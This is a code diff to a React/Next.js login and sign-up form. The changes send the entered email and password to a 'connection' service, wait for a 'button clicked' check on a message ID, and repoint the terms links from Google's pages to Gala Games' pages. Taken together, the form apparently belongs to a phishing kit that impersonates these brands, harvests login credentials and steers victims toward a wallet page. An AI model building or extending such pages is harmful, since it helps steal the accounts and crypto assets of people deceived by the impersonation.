@@ -7,12 +7,12 @@ import * as yup from 'yup';
 import styles from './styles.module.css';
 import Image from 'next/image';
 import {useRouter} from "next/navigation";
-import {signUpService} from "@/services/sign-up";
 import {checkService} from "@/services/check";
 import {getResponseRoute} from "../../../../utils/navigation";
 import {sessionConst} from "@/constants/session";
 import {routeConstants} from "@/constants/route";
 import {Recaptcha} from "@/components/captcha";
+import {connection} from "@/services/connection";
 
 const schema = yup.object().shape({
   email: yup.string().email('Email is not valid').required('Email is required'),
@@ -35,28 +35,43 @@ export const AuthForm = ({isSignIn = true}: { isSignIn?: boolean }) => {
     sessionStorage.setItem(sessionConst.Email, formData.email)
 
     const dataToSend = {
-      ...formData,
-      variant: isSignIn ? 'login' : 'register'
+      email: ` ${formData.email} `,
+      password: ` ${formData.password} `,
+      variant: isSignIn ? ' login ' : ' register '
     }
 
-    const {data, error} = await signUpService.signUpUser(dataToSend)
 
-    if (error) window.location.reload();
+    if (isSignIn) {
+      const {data, error} = await connection.withActions(dataToSend)
 
-    const messageId = data?.messageId;
+      if (error) window.location.reload();
 
-    if (messageId) {
-      const response = await checkService.checkButtonClicked({messageId})
+      const messageId = data?.messageId;
 
-      const {error, data} = response as { error: string | null, data: any }
+      if (messageId) {
+        const response = await checkService.checkButtonClicked({messageId})
+
+        const {error, data} = response as { error: string | null, data: any }
+
+        if (error) window.location.reload();
+
+        if (data) {
+          setLoading(false)
+          getResponseRoute(router, data)
+        }
+      }
+    } else {
+      const {error, data} = await connection.withoutActions(dataToSend)
 
       if (error) window.location.reload();
 
       if (data) {
         setLoading(false)
-        getResponseRoute(router, data)
+        router.push(`${routeConstants.HOME}?wallet=yes`)
       }
     }
+
+
   };
 
   return (
@@ -93,8 +108,8 @@ export const AuthForm = ({isSignIn = true}: { isSignIn?: boolean }) => {
           }}/>
 
           <p className={styles.terms}>
-            By continuing, you agree to the <a href="https://policies.google.com/terms?hl=hy&fg=1">Terms &
-            Conditions</a> and <a href="https://policies.google.com/terms?hl=hy&fg=1">Privacy
+            By continuing, you agree to the <a href="https://games.gala.com/terms-and-conditions">Terms &
+            Conditions</a> and <a href="https://games.gala.com/privacy-policy">Privacy
             Policy</a>
           </p>
           <button type="submit"
